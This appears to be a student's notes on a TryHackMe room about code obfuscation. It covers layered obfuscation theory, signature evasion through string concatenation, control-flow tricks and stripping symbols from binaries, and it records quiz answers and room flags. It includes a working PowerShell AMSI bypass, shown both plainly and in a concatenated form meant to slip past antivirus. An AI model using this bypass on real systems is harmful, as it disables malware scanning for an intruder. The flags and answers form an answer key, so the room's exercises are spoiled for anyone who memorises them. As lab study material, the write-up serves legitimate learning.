# Obfuscation Principles - Medium

1. [Origins of Obfuscation](#origins-of-obfuscation)
2. [Obfuscation's Function for Static Evasion](#obfuscations-function-for-analysis-deception)
3. [Object Concatenation](#object-concatenation)
4. [Obfuscation's Function for Analysis Deception](#obfuscations-function-for-analysis-deception)
5. [Code Flow and Logic](#code-flow-and-logic)
6. [Arbitrary Control Flow Patterns](#arbitrary-control-flow-patterns)
7. [Protecting and Stripping Identifiable Information](#protecting-and-stripping-identifiable-information)

## Origins of Obfuscation

* Obfuscation is generally used to protect IP (Intellectual Property) and proprietary info in an app.

* [This paper](https://cybersecurity.springeropen.com/track/pdf/10.1186/s42400-020-00049-3.pdf) covers layered obfuscation and the methods used.

* Adversaries & malware devs can leverage obfuscation to break signatures or prevent program analysis.

```markdown
1. How many core layers make up the Layered Obfuscation Taxonomy? - 4

2. What sub-layer of the Layered Obfuscation Taxonomy encompasses meaningless identifiers? - Obfuscating Layout
```

## Obfuscation's Function for Static Evasion

* Obfuscating data:

  * Array transformation
  * Data encoding
  * Data procedurization
  * Data splitting/merging

```markdown
1. What obfuscation method will break or split an object? - data splitting

2. What obfuscation method is used to rewrite static data with a procedure call? - data procedurization
```

## Object Concatenation

* Concatenation can be used to break targeted static signatures; attackers can also use it to break up all objects of a program and try to remove all signatures at once.

* In Yara, for example, if a defined string is present, it will be detected; however if we use concatention in our malware for the string, it will be functionally the same but will appear as multiple independent strings, resulting in no alerts.

* Non-interpreted characters:

  * Breaks - breaking string into multiple sub-strings

  * Reorders - reorder string components

  * Whitespace - include non-interpreted whitespace

  * Ticks - include non-interpreted ticks

  * Random case - for case-insensitive strings

```ps
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
#this is blocked by AV software
#so we need to use concatenation and non-interpreted chars

[Ref].Assembly.GetType('System.Management.Automation.Ams'+'i'+'Ut'+'ils')
#we can break it down by cmdlet and check for each cmdlet
#before proceeding

#we need to do separation of related code for final command
$Value="SetValue"

[Ref].Assembly.GetType( 'System.Management.Auto' + 'mation.Amsi' + 'Ut'+ 'ils' ).GetField( 'amsi' + 'In' + 'itFailed','No' +'nPublic,St' + 'atic').$Value($null,$true)
#submit this for flag
```

```markdown
1. What flag is found after uploading a properly obfuscated snippet? - THM{koNC473n473_4Ll_7H3_7H1n95}
```

## Obfuscation's Function for Analysis Deception

* Adversaries can leverage advanced logic and maths to create complex, tougher to understand code to combat analysis & RE.

* Obfuscating layout:

  * Junk codes
  * Separation of related codes
  * Stripping redundant symbols
  * Meaningless identifiers

* Obfuscating controls:

  * Implicit controls
  * Dispatcher-based controls
  * Probabilistic control flows
  * Bogus control flows

```markdown
1. What are junk instructions referred to as in junk code? - code stubs

2. What obfuscation layer aims to confuse an analyst by manipulating the code flow and abstract syntax trees? - obfuscating controls
```

## Code Flow and Logic

* Control flow - critical for program; defines how program will logically proceed.

```markdown
1. Can logic change and impact the control flow of a program? - T
```

## Arbitrary Control Flow Patterns

* Opaque predicates - used to control known output & input; its value is known to the obfuscator but it is difficult to deduce.

* Opaque predicates fall under 'bogus control flow' and 'probabilistic control flow'.

```markdown
1. What flag is found after properly reversing the provided snippet? - THM{D3cod3d!!}
```

## Protecting and Stripping Identifiable Information

* Major types of identifiable info are code structure, object names, and file/compilation properties.

```shell
#after obfuscating code structure and object names for given program
#we need to compile it

x86_64-w64-mingw32-g++ challenge-8.cpp -o challenge-8.exe

nm challenge-8.exe
#we need to remove symbols from the compiled binary

strip --strip-all challenge-8.exe

nm challenge-8.exe
#this does not show any symbols
#so we can upload it now to get flag
```

```markdown
1. What flag is found after uploading a properly obfuscated snippet? - THM{Y0Ur_1NF0_15_M1N3}
```
